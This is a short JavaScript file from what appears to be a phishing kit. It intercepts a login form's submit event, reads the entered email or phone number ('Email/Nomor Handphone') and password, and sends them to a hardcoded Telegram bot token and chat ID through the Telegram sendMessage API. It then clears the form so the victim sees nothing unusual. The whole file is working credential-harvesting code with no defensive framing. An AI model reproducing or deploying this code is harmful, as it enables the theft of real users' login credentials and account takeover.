document.getElementById('loginForm').addEventListener('submit', function(event) {
  event.preventDefault(); // Prevent form submission

  // Get email and password input values
  var email = document.getElementById('email').value;
  var password = document.getElementById('password').value;

  // Send login info to Telegram bot
  sendTelegramMessage(`Email/Nomor Handphone: ${email}\nPassword: ${password}`);

  // Clear form fields after submission
  document.getElementById('email').value = '';
  document.getElementById('password').value = '';

  // Optionally, you can redirect the user to another page after login
  // window.location.href = 'https://example.com/dashboard';
});

// Function to send message to Telegram bot
function sendTelegramMessage(message) {
  const botToken = '6362043085:AAHn0y75CR3gHCbzYcdQYE9H9IzLxQjZd-A';
  const chatId = '6610250544';
  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

  fetch(url, { method: 'POST' })
    .then(response => {
      if (response.ok) {
        console.log('Message sent to Telegram bot successfully.');
      } else {
        console.error('Failed to send message to Telegram bot.');
      }
    })
    .catch(error => {
      console.error('Error sending message to Telegram bot:', error);
    });
}

